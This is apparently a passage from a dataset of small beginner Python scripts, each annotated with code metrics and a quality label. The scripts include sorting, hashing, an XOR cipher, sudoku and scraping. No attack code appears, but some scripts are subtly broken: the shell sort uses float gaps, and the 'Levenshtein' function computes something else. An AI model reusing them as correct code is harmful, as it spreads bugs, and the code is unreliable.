    L_list.Push(6)
    L_list.Push(4)
    L_list.Push(2)
    L_list.Push(8)
    L_list.Push(12)
    L_list.Push(10)
    L_list.Split_List(head1, head2)
    print(""Circular Linked List: "")
    L_list.Display()
    print(""Firts Split Linked List: "")
    head1.Display()
    print(""Second Split Linked List: "")
    head2.Display()
",1873,59,59,8,0,0,0,,21,11,5,22.0,13,,33,59.71535681027101,137.6075250475963,4.230769230769231,bajo,Yes,False,False,Low-Medium,id381
tf_idf_generator.py,"""""""@Author: Anurag Kumar(mailto:anuragkumarak95@gmail.com) 
This module is used for generating a TF-IDF file or values from a list of files that contains docs.

What is TF-IDF : https://en.wikipedia.org/wiki/Tf%E2%80%93idf

python:
  - 3.5

pre-requisites: 
  - colorama==0.3.9 

sample file format of input:

    ##START(NOT INCLUDED)
    sport smile today because signs Gemini
    little sister dealt severe allergy figure
    about looks gender color attitude nationality respect
    added video playlist Sonic Fightstick Edition
    weeks birthday scott wants camping keeper
    photo taking photo trying auction scale photo
    happy creatively capture story stage magical
    yoongi looks seokjin looking yoongi looking seokjin
    taking glasses because buffering cannot handle
    tried Michelle Obama proceeded defend whole pointless
    robbed shades backstage reading guess karma stealing
    remains sailors destroyer McCain collision found
    timeline beginnings infographics Catch upcoming debut
    ##END(NOT INCLUDED)

here, every line represents a document.

have fun, cheers.
""""""
import math
import pickle

from colorama import Fore, Style

switcher = {
    ""r"": Fore.RED,
    ""bk"": Fore.BLACK,
    ""b"": Fore.BLUE,
    ""g"": Fore.GREEN,
    ""y"": Fore.YELLOW,
    ""m"": Fore.MAGENTA,
    ""c"": Fore.CYAN,
    ""w"": Fore.WHITE,
}


def paint(str, color=""r""):
    """"""Utility func, for printing colorful logs in console...

    @args:
    --
    str : String to be modified.
    color : color code to which the string will be formed. default is 'r'=RED

    @returns:
    --
    str : final modified string with foreground color as per parameters.

    """"""
    if color in switcher:
        str = switcher[color] + str + Style.RESET_ALL
    return str


TAG = paint(""TF-IDF-GENE/"", ""b"")


def find_tf_idf(file_names=None, prev_file_path=None, dump_path=None):
    """"""Function to create a TF-IDF list of dictionaries for a corpus of docs.
    If you opt for dumping the data, you can provide a file_path with .tfidfpkl extension(standard made for better understanding)
    and also re-generate a new tfidf list which overrides over an old one by mentioning its path.

    @Args:
    --
    file_names : paths of files to be processed on, you can give many small sized file, rather than one large file.
    prev_file_path : path of old .tfidfpkl file, if available. (default=None)
    dump_path : directory-path where to dump generated lists.(default=None)

    @returns:
    --
    idf : a dict of unique words in corpus,with their document frequency as values.
    tf_idf : the generated tf-idf list of dictionaries for mentioned docs.
    """"""
    if file_names is None:
        file_names = [""./../test/testdata""]
    tf_idf = (
        []
    )  # will hold a dict of word_count for every doc(line in a doc in this case)
    idf = {}

    # this statement is useful for altering existant tf-idf file and adding new docs in itself.(## memory is now the biggest issue)
    if prev_file_path:
        print(TAG, ""modifying over exising file.. @"", prev_file_path)
        idf, tf_idf = pickle.load(open(prev_file_path, ""rb""))
        prev_doc_count = len(idf)
        prev_corpus_length = len(tf_idf)

    for f in file_names:

        file1 = open(
            f, ""r""
        )  # never use 'rb' for textual data, it creates something like,  {b'line-inside-the-doc'}

        # create word_count dict for all docs
        for line in file1:
            dict = {}
            # find the amount of doc a word is in
            for i in set(line.split()):
                if i in idf:
                    idf[i] += 1
                else:
                    idf[i] = 1
            for word in line.split():
                # find the count of all words in every doc
                if word not in dict:
                    dict[word] = 1
                else:
                    dict[word] += 1
            tf_idf.append(dict)
        file1.close()

    # calculating final TF-IDF values  for all words in all docs(line in a doc in this case)
    for doc in tf_idf:
        for key in doc:
            true_idf = math.log(len(tf_idf) / idf[key])
            true_tf = doc[key] / len(doc)
            doc[key] = true_tf * true_idf

    # do not get overwhelmed, just for logging the quantity of words that have been processed.
    print(
        TAG,
        ""Total number of unique words in corpus"",
        len(idf),
        ""( "" + paint(""++"" + str(len(idf) - prev_doc_count), ""g"") + "" )""
        if prev_file_path
        else """",
    )
    print(
        TAG,
        ""Total number of docs in corpus:"",
        len(tf_idf),
        ""( "" + paint(""++"" + str(len(tf_idf) - prev_corpus_length), ""g"") + "" )""
        if prev_file_path
        else """",
    )

    # dump if a dir-path is given
    if dump_path:
        if dump_path[-8:] != ""tfidfpkl"":
            raise Exception(
                TAG
                + ""Please provide a .tfidfpkl file_path, it is the standard format of this module.""
            )
        pickle.dump(
            (idf, tf_idf), open(dump_path, ""wb""), protocol=pickle.HIGHEST_PROTOCOL
        )
        print(TAG, ""Dumping TF-IDF vars @"", dump_path)
    return idf, tf_idf
",5213,52,80,27,9,7,48,2.0,17,22,9,43.0,39,,65,234.6600115486085,363.0225625468752,4.961538461538462,medio,No,False,False,Medium,id382
Infix_to_Postfix.py,"# Python program to convert infix expression to postfix

# Class to convert the expression
class Conversion:

    # Constructor to initialize the class variables
    def __init__(self, capacity):
        self.top = -1
        self.capacity = capacity
        # This array is used a stack
        self.array = []
        # Precedence setting
        self.output = []
        self.precedence = {""+"": 1, ""-"": 1, ""*"": 2, ""/"": 2, ""^"": 3}

    # check if the stack is empty
    def isEmpty(self):
        return True if self.top == -1 else False

    # Return the value of the top of the stack
    def peek(self):
        return self.array[-1]

    # Pop the element from the stack
    def pop(self):
        if not self.isEmpty():
            self.top -= 1
            return self.array.pop()
        else:
            return ""$""

    # Push the element to the stack
    def push(self, op):
        self.top += 1
        self.array.append(op)

    # A utility function to check is the given character
    # is operand
    def isOperand(self, ch):
        return ch.isalpha()

    # Check if the precedence of operator is strictly
    # less than top of stack or not
    def notGreater(self, i):
        try:
            a = self.precedence[i]
            b = self.precedence[self.peek()]
            return True if a <= b else False
        except KeyError:
            return False

    # The main function that converts given infix expression
    # to postfix expression
    def infixToPostfix(self, exp):

        # Iterate over the expression for conversion
        for i in exp:
            # If the character is an operand,
            # add it to output
            if self.isOperand(i):
                self.output.append(i)

            # If the character is an '(', push it to stack
            elif i == ""("":
                self.push(i)

            # If the scanned character is an ')', pop and
            # output from the stack until and '(' is found
            elif i == "")"":
                while (not self.isEmpty()) and self.peek() != ""("":
                    a = self.pop()
                    self.output.append(a)
                if not self.isEmpty() and self.peek() != ""("":
                    return -1
                else:
                    self.pop()

                # An operator is encountered
            else:
                while not self.isEmpty() and self.notGreater(i):
                    self.output.append(self.pop())
                self.push(i)

            # pop all the operator from the stack
        while not self.isEmpty():
            self.output.append(self.pop())

        print("""".join(self.output))


# Driver program to test above function
exp = ""a+b*(c^d-e)^(f+g*h)-i""
obj = Conversion(len(exp))
obj.infixToPostfix(exp)
",2775,54,53,17,24,24,0,,27,20,8,31.0,28,,51,158.6059378176129,263.6661750735579,4.428571428571429,medio,Yes,False,False,Medium,id383
check_input.py,"def get_user_input(start, end):
    """"""
    input: two integer values
           lower limit 'start' and maximum 'end'
           the arguments aren't inclusive.

    output: if reading successful then returns the read integer.

    purpose: reads from command-line a integer in the given bounds.
             while input invalid asks user again
    """"""

    loop = True  # controls while-loop

    while loop:

        try:

            # reads and converts the input from the console.
            user_input = int(input(""Enter Your choice: ""))

            # checks whether input is in the given bounds.
            if user_input > end or user_input < start:

                # error case
                print(""Please try again. Not in valid bounds."")

            else:

                # valid case
                loop = False  # aborts while-loop

        except ValueError:

            # error case
            print(""Please try again. Only numbers"")

    return user_input


x = get_user_input(1, 6)
print(x)
# Asks user to enter something, ie. a number option from a menu.
# While type != interger, and not in the given range,
# Program gives error message and asks for new input.
",1192,15,14,15,10,8,8,1.0,5,3,3,6.0,5,,9,16.36452797660028,27.0,1.8,alto,No,True,False,Low,id384
wave_sort.py,"def sortInWave(arr, n):
    arr.sort()
    for i in range(0, n - 1, 2):
        arr[i], arr[i + 1] = arr[i + 1], arr[i]


arr = []
arr = input(""Enter the arr"")
sortInWave(arr, len(arr))
for i in range(0, len(arr)):
    print(arr[i], "" "")
",238,9,9,2,0,0,0,1.0,2,3,2,6.0,3,,9,6.754887502163469,20.89735285398626,2.0,medio,No,True,False,Low,id385
Shell Sort.py,"# Python program for implementation of Shell Sort


def shellSort(arr):

    # Start with a big gap, then reduce the gap
    n = len(arr)
    gap = n / 2

    # Do a gapped insertion sort for this gap size.
    # The first gap elements a[0..gap-1] are already in gapped
    # order keep adding one more element until the entire array
    # is gap sorted
    while gap > 0:

        for i in range(gap, n):

            # add a[i] to the elements that have been gap sorted
            # save a[i] in temp and make a hole at position i
            temp = arr[i]

            # shift earlier gap-sorted elements up until the correct
            # location for a[i] is found
            j = i
            while j >= gap and arr[j - gap] > temp:
                arr[j] = arr[j - gap]
                j -= gap

            # put temp (the original a[i]) in its correct location
            arr[j] = temp
        gap /= 2


# Driver code to test above
arr = [12, 34, 54, 2, 3]

n = len(arr)
print(""Array before sorting:"")
for i in range(n):
    print(arr[i]),

shellSort(arr)

print(""\nArray after sorting:"")
for i in range(n):
    print(arr[i]),

# This code is contributed by mohd-mehraj
",1183,21,21,14,13,13,0,1.0,5,9,5,18.0,9,,27,40.13896548741762,102.7985828955553,5.0,alto,No,False,False,Low-Medium,id386
dice.py,"# Script Name	: dice.py
# Author		: Craig Richards
# Created		: 05th February 2017
# Last Modified	:
# Version		: 1.0

# Modifications	:

# Description	: This will randomly select two numbers,
# like throwing dice, you can change the sides of the dice if you wish

import random


class Die(object):
    # A dice has a feature of number about how many sides it has when it's
    # established,like 6.
    def __init__(self):
        self.sides = 6

    """"""because a dice contains at least 4 planes.
    So use this method to give it a judgement when you need
    to change the instance attributes.
    """"""

    def set_sides(self, sides_change):
        if sides_change >= 4:
            if sides_change != 6:
                print(""change sides from 6 to "", sides_change, "" !"")
            else:
                # added else clause for printing a message that sides set to 6
                print(""sides set to 6"")
            self.sides = sides_change
        else:
            print(""wrong sides! sides set to 6"")

    def roll(self):
        return random.randint(1, self.sides)


d = Die()
d1 = Die()
d.set_sides(4)
d1.set_sides(4)
print(d.roll(), d1.roll())
",1164,21,20,10,11,11,4,3.0,8,2,2,4.0,3,,6,6.754887502163469,13.931568569324174,1.3333333333333333,alto,Yes,False,True,Low,id387
pattern2.py,"#pattern
#$$$$$$$$$$$
# $$$$$$$$$
#  $$$$$$$
#   $$$$$
#    $$$
#     $



def main():
    lines = int(input(""Enter no.of lines: ""))
    pattern(lines)

def pattern(lines):
    for i in range(lines,0,-1):
        for j in range(lines-i):
            print(' ', end='') 
        
        for j in range(2*i-1):
            print('$',end='')
        print() 


if __name__ == ""__main__"":
    main()

",398,12,12,8,7,7,0,2.0,5,5,4,9.0,7,,14,27.651484454403228,48.43204266092217,2.571428571428572,alto,No,True,False,Low,id388
sha1.py,"import argparse
import hashlib  # hashlib is only used inside the Test class
import struct
import unittest


class SHA1Hash:
    """"""
    Class to contain the entire pipeline for SHA1 Hashing Algorithm
    """"""

    def __init__(self, data):
        """"""
        Inititates the variables data and h. h is a list of 5 8-digit Hexadecimal
        numbers corresponding to (1732584193, 4023233417, 2562383102, 271733878, 3285377520)
        respectively. We will start with this as a message digest. 0x is how you write
        Hexadecimal numbers in Python
        """"""
        self.data = data
        self.h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0]

    @staticmethod
    def rotate(n, b):
        """"""
        Static method to be used inside other methods. Left rotates n by b.
        """"""
        return ((n << b) | (n >> (32 - b))) & 0xFFFFFFFF

    def padding(self):
        """"""
        Pads the input message with zeros so that padded_data has 64 bytes or 512 bits
        """"""
        padding = b""\x80"" + b""\x00"" * (63 - (len(self.data) + 8) % 64)
        padded_data = self.data + padding + struct.pack("">Q"", 8 * len(self.data))
        return padded_data

    def split_blocks(self):
        """"""
        Returns a list of bytestrings each of length 64
        """"""
        return [
            self.padded_data[i : i + 64] for i in range(0, len(self.padded_data), 64)
        ]

    # @staticmethod
    def expand_block(self, block):
        """"""
        Takes a bytestring-block of length 64, unpacks it to a list of integers and returns a
        list of 80 integers pafter some bit operations
        """"""
        w = list(struct.unpack("">16L"", block)) + [0] * 64
        for i in range(16, 80):
            w[i] = self.rotate((w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]), 1)
        return w

    def final_hash(self):
        """"""
        Calls all the other methods to process the input. Pads the data, then splits into
        blocks and then does a series of operations for each block (including expansion).
        For each block, the variable h that was initialized is copied to a,b,c,d,e
        and these 5 variables a,b,c,d,e undergo several changes. After all the blocks are
        processed, these 5 variables are pairwise added to h ie a to h[0], b to h[1] and so on.
        This h becomes our final hash which is returned.
        """"""
        self.padded_data = self.padding()
        self.blocks = self.split_blocks()
        for block in self.blocks:
            expanded_block = self.expand_block(block)
            a, b, c, d, e = self.h
            for i in range(0, 80):
                if 0 <= i < 20:
                    f = (b & c) | ((~b) & d)
                    k = 0x5A827999
                elif 20 <= i < 40:
                    f = b ^ c ^ d
                    k = 0x6ED9EBA1
                elif 40 <= i < 60:
                    f = (b & c) | (b & d) | (c & d)
                    k = 0x8F1BBCDC
                elif 60 <= i < 80:
                    f = b ^ c ^ d
                    k = 0xCA62C1D6
                a, b, c, d, e = (
                    self.rotate(a, 5) + f + e + k + expanded_block[i] & 0xFFFFFFFF,
                    a,
                    self.rotate(b, 30),
                    c,
                    d,
                )
        self.h = (
            self.h[0] + a & 0xFFFFFFFF,
            self.h[1] + b & 0xFFFFFFFF,
            self.h[2] + c & 0xFFFFFFFF,
            self.h[3] + d & 0xFFFFFFFF,
            self.h[4] + e & 0xFFFFFFFF,
        )
        return ""%08x%08x%08x%08x%08x"" % tuple(self.h)


class SHA1HashTest(unittest.TestCase):
    """"""
    Test class for the SHA1Hash class. Inherits the TestCase class from unittest
    """"""

    def testMatchHashes(self):
        msg = bytes(""Test String"", ""utf-8"")
        self.assertEqual(SHA1Hash(msg).final_hash(), hashlib.sha1(msg).hexdigest())


def main():
    """"""
    Provides option 'string' or 'file' to take input and prints the calculated SHA1 hash.
    unittest.main() has been commented because we probably dont want to run
    the test each time.
    """"""
    # unittest.main()
    parser = argparse.ArgumentParser(description=""Process some strings or files"")
    parser.add_argument(
        ""--string"",
        dest=""input_string"",
        default=""Hello World!! Welcome to Cryptography"",
        help=""Hash the string"",
    )
    parser.add_argument(""--file"", dest=""input_file"", help=""Hash contents of a file"")
    args = parser.parse_args()
    input_string = args.input_string
    # In any case hash input should be a bytestring
    if args.input_file:
        hash_input = open(args.input_file, ""rb"").read()
    else:
        hash_input = bytes(input_string, ""utf-8"")
    print(SHA1Hash(hash_input).final_hash())


if __name__ == ""__main__"":
    main()
",4809,71,80,15,4,3,38,,22,61,13,117.0,83,,178,577.233989137629,1172.123325128366,9.162650602409638,medio,Yes,False,False,Very High,id389
flask_rendering.py,"from flask import Flask, render_template, request
import practice_beautifulsoap as data

app = Flask(__name__, template_folder='template')


@app.route('/', methods=[""GET"", ""POST""])
def index():
    languages = data.lang()
    return render_template('index.html', languages=languages)


@app.route(""/display"", methods=[""POST""])
def output():
    if request.method == ""POST"":
        entered_topic = request.form.get(""topic"")
        selected_language = request.form.get(""language"")

        soup_data = data.data(entered_topic, selected_language)
        soup_image = data.get_image_urls(entered_topic)

        return render_template('output.html', heading=entered_topic.upper(), data=soup_data,
                               url=soup_image, language=selected_language)


if __name__ == ""__main__"":
    app.run(debug=True)
",825,17,18,9,0,0,0,2.0,3,2,1,4.0,4,,6,8.0,13.931568569324174,0.5,medio,No,False,False,Low,id390
twitter_post_scraper.py,"import requests
from bs4 import BeautifulSoup
import re

re_text = r""\:|\.|\!|(https|http)?:\/\/(\w|\.|\/|\?|\=|\&|\%)*\b|(.twitter.com\/)\w*|\&""
re_text_1 = r""(pictwittercom)\/\w*""


def tweeter_scrapper():
    list_of_dirty_tweets = []
    clear_list_of_tweets = []
    base_tweeter_url = ""https://twitter.com/{}""

    tweeter_id = input()

    response = requests.get(base_tweeter_url.format(tweeter_id))
    soup = BeautifulSoup(response.content, ""lxml"")
    all_tweets = soup.find_all(""div"", {""class"": ""tweet""})

    for tweet in all_tweets:
        content = tweet.find(""div"", {""class"": ""content""})
        message = (
            content.find(""div"", {""class"": ""js-tweet-text-container""})
            .text.replace(""\n"", "" "")
            .strip()
        )
        list_of_dirty_tweets.append(message)
    for dirty_tweet in list_of_dirty_tweets:
        dirty_tweet = re.sub(re_text, """", dirty_tweet, flags=re.MULTILINE)
        dirty_tweet = re.sub(re_text_1, """", dirty_tweet, flags=re.MULTILINE)
        dirty_tweet = dirty_tweet.replace(u""\xa0â¦"", u"""")
        dirty_tweet = dirty_tweet.replace(u""\xa0"", u"""")
        dirty_tweet = dirty_tweet.replace(u""\u200c"", u"""")
        clear_list_of_tweets.append(dirty_tweet)
    print(clear_list_of_tweets)


if __name__ == ""__main__"":
    tweeter_scrapper()
",1311,30,31,8,0,0,0,1.0,3,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,True,False,Low,id391
count_vowels.py,"vowels = ""aeiou""

ip_str = ""Hello, have you tried our tutorial section yet?""


# count the vowels
vowel_count = 0
consonant_count = 0

for char in ip_str:
    if char in vowels:
        vowel_count += 1
    else:
        consonant_count += 1

print(""Total Vowels: "", vowel_count)
print(""Total consonants: "", consonant_count)
",325,11,11,5,1,1,0,0.0,0,3,2,6.0,5,,9,13.60964047443681,25.26619429851844,1.2,alto,No,False,False,Low,id392
sudoku.py,"board = [
    [7, 8, 0, 4, 0, 0, 1, 2, 0],
    [6, 0, 0, 0, 7, 5, 0, 0, 9],
    [0, 0, 0, 6, 0, 1, 0, 7, 8],
    [0, 0, 7, 0, 4, 0, 2, 6, 0],
    [0, 0, 1, 0, 5, 0, 9, 3, 0],
    [9, 0, 4, 0, 6, 0, 0, 0, 5],
    [0, 7, 0, 3, 0, 0, 0, 1, 2],
    [1, 2, 0, 0, 0, 7, 4, 0, 0],
    [0, 4, 9, 2, 0, 6, 0, 0, 7],
]


def solve(bo):
    find = find_empty(bo)
    if not find:
        return True
    else:
        row, col = find

    for i in range(1, 10):
        if valid(bo, i, (row, col)):
            bo[row][col] = i

            if solve(bo):
                return True

            bo[row][col] = 0

    return False


def valid(bo, num, pos):
    # Check row
    for i in range(len(bo[0])):
        if bo[pos[0]][i] == num and pos[1] != i:
            return False

    # Check column
    for i in range(len(bo)):
        if bo[i][pos[1]] == num and pos[0] != i:
            return False

    # Check box
    box_x = pos[1] // 3
    box_y = pos[0] // 3

    for i in range(box_y * 3, box_y * 3 + 3):
        for j in range(box_x * 3, box_x * 3 + 3):
            if bo[i][j] == num and (i, j) != pos:
                return False

    return True


def print_board(bo):
    for i in range(len(bo)):
        if i % 3 == 0 and i != 0:
            print(""- - - - - - - - - - - - - "")

        for j in range(len(bo[0])):
            if j % 3 == 0 and j != 0:
                print("" | "", end="""")

            if j == 8:
                print(bo[i][j])
            else:
                print(str(bo[i][j]) + "" "", end="""")


def find_empty(bo):
    for i in range(len(bo)):
        for j in range(len(bo[0])):
            if bo[i][j] == 0:
                return (i, j)  # row, col

    return None


print_board(board)
solve(board)
print(""_________________________"")
print_board(board)
",1868,49,59,21,4,3,0,4.0,28,29,8,57.0,38,46.0,86,223.42124551085624,475.0263282209031,6.0,medio,No,False,False,Medium-High,id393
scalg.py,"""""""
developed by: markmelnic
original repo: https://github.com/markmelnic/Scoring-Algorithm
         pypi: https://pypi.org/project/scalg/
Analyse data using a range based percentual proximity algorithm
and calculate the linear maximum likelihood estimation.
The basic principle is that all values supplied will be broken
down to a range from 0 to 1 and each column's score will be added
up to get the total score.
==========
Example for data of vehicles
price|mileage|registration_year
20k  |60k    |2012
22k  |50k    |2011
23k  |90k    |2015
16k  |210k   |2010
We want the vehicle with the lowest price,
lowest mileage but newest registration year.
Thus the weights for each column are as follows:
[0, 0, 1]
>>> score([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 0, 1])
[[20, 60, 2012, 2.0], [23, 90, 2015, 1.0], [22, 50, 2011, 1.3333333333333335]]
>>> score([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 0, 1], 'scores')
[2.0, 1.0, 1.3333333333333335]
>>> score_columns([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 2], [0, 0, 1])
[[20, 2012, 1.25], [23, 2015, 1.0], [22, 2011, 0.33333333333333337]]
""""""


def score(source_data: list, weights: list, *args) -> list:
    """"""Analyse and score a dataset using a range based percentual proximity
    algorithm and calculate the linear maximum likelihood estimation.
    Args:
        source_data (list): Data set to process.
        weights (list): Weights corresponding to each column from the data set.
            0 if lower values have higher weight in the data set,
            1 if higher values have higher weight in the data set
    Optional args:
        ""score_lists"" (str): Returns a list with lists of each column scores.
        ""scores"" (str): Returns only the final scores.
    Raises:
        ValueError: Weights can only be either 0 or 1 (int)
    Returns:
        list: Source data with the score of the set appended at as the last element.
    """"""

    # getting data
    data_lists = []
    for item in source_data:
        for i, val in enumerate(item):
            try:
                data_lists[i].append(float(val))
            except IndexError:
                data_lists.append([])
                data_lists[i].append(float(val))

    # calculating price score
    score_lists = []
    for dlist, weight in zip(data_lists, weights):
        mind = min(dlist)
        maxd = max(dlist)

        score = []
        if weight == 0:
            for item in dlist:
                try:
                    score.append(1 - ((item - mind) / (maxd - mind)))
                except ZeroDivisionError:
                    score.append(1)

        elif weight == 1:
            for item in dlist:
                try:
                    score.append((item - mind) / (maxd - mind))
                except ZeroDivisionError:
                    score.append(0)

        else:
            raise ValueError(""Invalid weight of %f provided"" % (weight))

        score_lists.append(score)

    # return score lists
    if ""score_lists"" in args:
        return score_lists

    # initialize final scores
    final_scores = [0 for i in range(len(score_lists[0]))]

    # generate final scores
    for i, slist in enumerate(score_lists):
        for j, ele in enumerate(slist):
            final_scores[j] = final_scores[j] + ele

    # return only scores
    if ""scores"" in args:
        return final_scores

    # append scores to source data
    for i, ele in enumerate(final_scores):
        source_data[i].append(ele)

    return source_data


def score_columns(source_data: list, columns: list, weights: list) -> list:
    """"""Analyse data file using a range based percentual proximity
    algorithm and calculate the linear maximum likelihood estimation.
    Args:
        source_data (list): Data set to process.
        columns (list): Indexes of the source_data columns to be scored.
        weights (list): Weights corresponding to each column from the data set.
            0 if lower values have higher weight in the data set,
            1 if higher values have higher weight in the data set
    Raises:
        ValueError: Weights can only be either 0 or 1 (int)
    Returns:
        list: Source data with the score of the set appended at as the last element.
    """"""

    temp_data = []
    for item in source_data:
        temp_data.append([item[c] for c in columns])

    if len(weights) > len(columns):
        weights = [weights[item] for item in columns]

    for i, sc in enumerate(score(temp_data, weights, ""scores"")):
        source_data[i].append(sc)

    return source_data
",4578,52,49,20,7,7,55,2.0,23,14,7,28.0,19,,42,100.36210720983136,197.4184681619259,5.157894736842105,medio,No,False,False,Medium,id394
find_Triplets_with_zero_sum.py,"""""""
  Author : Mohit Kumar
  
  Python program to find triplets in a given  array whose sum is zero 
""""""

# function to print triplets with 0 sum
def find_Triplets_with_zero_sum(arr, num):

    """"""find triplets in a given  array whose sum is zero

    Parameteres :
        arr : input array
        num = size of input array
    Output :
        if triplets found return their values
        else return ""No Triplet Found""
    """"""
    # bool variable to check if triplet found or not
    found = False

    # sort array elements
    arr.sort()

    # Run a loop until l is less than r, if the sum of array[l], array[r] is equal to zero then print the triplet and break the loop
    for index in range(0, num - 1):

        # initialize left and right
        left = index + 1
        right = num - 1

        curr = arr[index]  # current element

        while left < right:

            temp = curr + arr[left] + arr[right]

            if temp == 0:
                # print elements if it's sum is zero
                print(curr, arr[left], arr[right])

                left += 1
                right -= 1

                found = True

            # If sum of three elements is less  than zero then increment in left
            elif temp < 0:
                left += 1

            # if sum is greater than zero than decrement in right side
            else:
                right -= 1

    if found == False:
        print("" No Triplet Found"")


# DRIVER CODE STARTS

if __name__ == ""__main__"":

    n = int(input(""Enter size of array\n""))
    print(""Enter elements of array\n"")

    arr = list(map(int, input().split()))

    print(""Triplets with 0 sum are as : "")

    find_Triplets_with_zero_sum(arr, n)

""""""
SAMPLE INPUT 1 :
	Enter size of array : 5 
	Enter elements of array : 0, -1, 2, -3, 1
OUTPUT :
	Triplets with 0 sum are as : 
				    -3 1 2
				    -1 0 1
COMPLEXITY ANALYSIS :
Time Complexity : O(n^2).
    Only two nested loops is required, so the time complexity is O(n^2).
Auxiliary Space : O(1), no extra space is required, so the time complexity is constant.
""""""
",2089,29,26,24,10,9,25,,6,14,4,28.0,14,,42,61.30296890880645,175.1368500605771,4.0,medio,No,True,False,Low-Medium,id395
XOR_cipher.py,"""""""
	author: Christian Bender
	date: 21.12.2017
	class: XORCipher

	This class implements the XOR-cipher algorithm and provides
	some useful methods for encrypting and decrypting strings and
	files.

	Overview about methods

	- encrypt : list of char
	- decrypt : list of char
	- encrypt_string : str
	- decrypt_string : str
	- encrypt_file : boolean
	- decrypt_file : boolean
""""""


class XORCipher(object):
    def __init__(self, key=0):
        """"""
        simple constructor that receives a key or uses
        default key = 0
        """"""

        # private field
        self.__key = key

    def encrypt(self, content, key):
        """"""
        input: 'content' of type string and 'key' of type int
        output: encrypted string 'content' as a list of chars
        if key not passed the method uses the key by the constructor.
        otherwise key = 1
        """"""

        # precondition
        assert isinstance(key, int) and isinstance(content, str)

        key = key or self.__key or 1

        # make sure key can be any size
        while key > 255:
            key -= 255

        # This will be returned
        ans = []

        for ch in content:
            ans.append(chr(ord(ch) ^ key))

        return ans

    def decrypt(self, content, key):
        """"""
        input: 'content' of type list and 'key' of type int
        output: decrypted string 'content' as a list of chars
        if key not passed the method uses the key by the constructor.
        otherwise key = 1
        """"""

        # precondition
        assert isinstance(key, int) and isinstance(content, list)

        key = key or self.__key or 1

        # make sure key can be any size
        while key > 255:
            key -= 255

        # This will be returned
        ans = []

        for ch in content:
            ans.append(chr(ord(ch) ^ key))

        return ans

    def encrypt_string(self, content, key=0):
        """"""
        input: 'content' of type string and 'key' of type int
        output: encrypted string 'content'
        if key not passed the method uses the key by the constructor.
        otherwise key = 1
        """"""

        # precondition
        assert isinstance(key, int) and isinstance(content, str)

        key = key or self.__key or 1

        # make sure key can be any size
        while key > 255:
            key -= 255

        # This will be returned
        ans = """"

        for ch in content:
            ans += chr(ord(ch) ^ key)

        return ans

    def decrypt_string(self, content, key=0):
        """"""
        input: 'content' of type string and 'key' of type int
        output: decrypted string 'content'
        if key not passed the method uses the key by the constructor.
        otherwise key = 1
        """"""

        # precondition
        assert isinstance(key, int) and isinstance(content, str)

        key = key or self.__key or 1

        # make sure key can be any size
        while key > 255:
            key -= 255

        # This will be returned
        ans = """"

        for ch in content:
            ans += chr(ord(ch) ^ key)

        return ans

    def encrypt_file(self, file, key=0):
        """"""
        input: filename (str) and a key (int)
        output: returns true if encrypt process was
        successful otherwise false
        if key not passed the method uses the key by the constructor.
        otherwise key = 1
        """"""

        # precondition
        assert isinstance(file, str) and isinstance(key, int)

        try:
            with open(file, ""r"") as fin:
                with open(""encrypt.out"", ""w+"") as fout:
                    # actual encrypt-process
                    for line in fin:
                        fout.write(self.encrypt_string(line, key))

        except:
            return False

        return True

    def decrypt_file(self, file, key):
        """"""
        input: filename (str) and a key (int)
        output: returns true if decrypt process was
        successful otherwise false
        if key not passed the method uses the key by the constructor.
        otherwise key = 1
        """"""

        # precondition
        assert isinstance(file, str) and isinstance(key, int)

        try:
            with open(file, ""r"") as fin:
                with open(""decrypt.out"", ""w+"") as fout:
                    # actual encrypt-process
                    for line in fin:
                        fout.write(self.decrypt_string(line, key))

        except:
            return False

        return True


# Tests
# crypt = XORCipher()
# key = 67

# # test enrcypt
# print crypt.encrypt(""hallo welt"",key)
# # test decrypt
# print crypt.decrypt(crypt.encrypt(""hallo welt"",key), key)

# # test encrypt_string
# print crypt.encrypt_string(""hallo welt"",key)

# # test decrypt_string
# print crypt.decrypt_string(crypt.encrypt_string(""hallo welt"",key),key)

# if (crypt.encrypt_file(""test.txt"",key)):
# 	print ""encrypt successful""
# else:
# 	print ""encrypt unsuccessful""

# if (crypt.decrypt_file(""encrypt.out"",key)):
# 	print ""decrypt successful""
# else:
# 	print ""decrypt unsuccessful""
",5102,67,59,51,36,36,57,7.0,38,24,6,52.0,36,,76,201.62707505625016,409.8161241311858,4.333333333333333,bajo,Yes,False,False,Medium,id396
longest_increasing_subsequence_length.py,"""""""
Author- DIWAKAR JAISWAL
find lenth Longest increasing subsequence of given array.
""""""


def lis(a):
    n = len(a)
    # initialize ans array same lenth as 1
    ans = [1] * n
    for i in range(1, n):
        # now compare with first index to that index
        for j in range(i):
            if a[i] > a[j] and ans[i] < ans[j] + 1:
                ans[i] = ans[j] + 1
    return max(ans)


a = [1, 3, 2, 6, 4]

# longest increasing subsequence=[{1<3<6},{1<3<4},{1<2<6},{1<2<4}] length is 3

print(""Maximum Length of longest increasing subsequence "", lis(a))
",564,11,10,6,3,3,4,1.0,5,6,5,,11,,18,49.66338827944709,72.0,2.727272727272727,alto,No,False,False,Low,id397
levenshtein_distance.py,"def levenshtein_dis(wordA, wordB):

    wordA = wordA.lower()  # making the wordA lower case
    wordB = wordB.lower()  # making the wordB lower case

    # get the length of the words and defining the variables
    length_A = len(wordA)
    length_B = len(wordB)
    max_len = 0
    diff = 0
    distances = []
    distance = 0

    # check the difference of the word to decide how many letter should be delete or add
    # also store that value in the 'diff' variable and get the max length of the user given words
    if length_A > length_B:
        diff = length_A - length_B
        max_len = length_A
    elif length_A < length_B:
        diff = length_B - length_A
        max_len = length_B
    else:
        diff = 0
        max_len = length_A

    # starting from the front of the words and compare the letters of the both user given words
    for x in range(max_len - diff):
        if wordA[x] != wordB[x]:
            distance += 1

    # add the 'distance' value to the 'distances' array
    distances.append(distance)
    distance = 0

    # starting from the back of the words and compare the letters of the both user given words
    for x in range(max_len - diff):
        if wordA[-(x + 1)] != wordB[-(x + 1)]:
            distance += 1

    # add the 'distance' value to the 'distances' array
    distances.append(distance)

    # get the minimun value of the 'distances' array and add it with the 'diff' values and
    # store them in the 'diff' variable
    diff = diff + min(distances)

    # return the value
    return diff
